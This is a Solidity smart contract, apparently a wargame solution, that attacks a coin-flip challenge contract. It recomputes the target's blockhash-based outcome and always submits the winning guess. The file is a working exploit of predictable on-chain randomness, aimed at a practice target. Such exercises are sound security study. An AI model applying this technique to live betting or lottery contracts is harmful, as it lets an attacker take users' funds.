/**
 *Submitted for verification at Etherscan.io on 2022-05-25
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

interface ICoinFlipChallenge {
    function flip(bool _guess) external returns (bool);
}
/**
 * @title Storage
 * @dev Store & retrieve value in a variable
 * @custom:dev-run-script ./scripts/deploy_with_ethers.ts
 */
contract HackCoinFlip {
    ICoinFlipChallenge public challenge;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    constructor(address challengeAddress) {
        challenge = ICoinFlipChallenge(challengeAddress);
    }


    function hackFlip(bool _guess) public {
        
        // pre-deteremine the flip outcome
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        // If I guessed correctly, submit my guess
        if (side == _guess) {
            challenge.flip(_guess);
        } else {
        // If I guess incorrectly, submit the opposite
            challenge.flip(!_guess);
        }
    }
}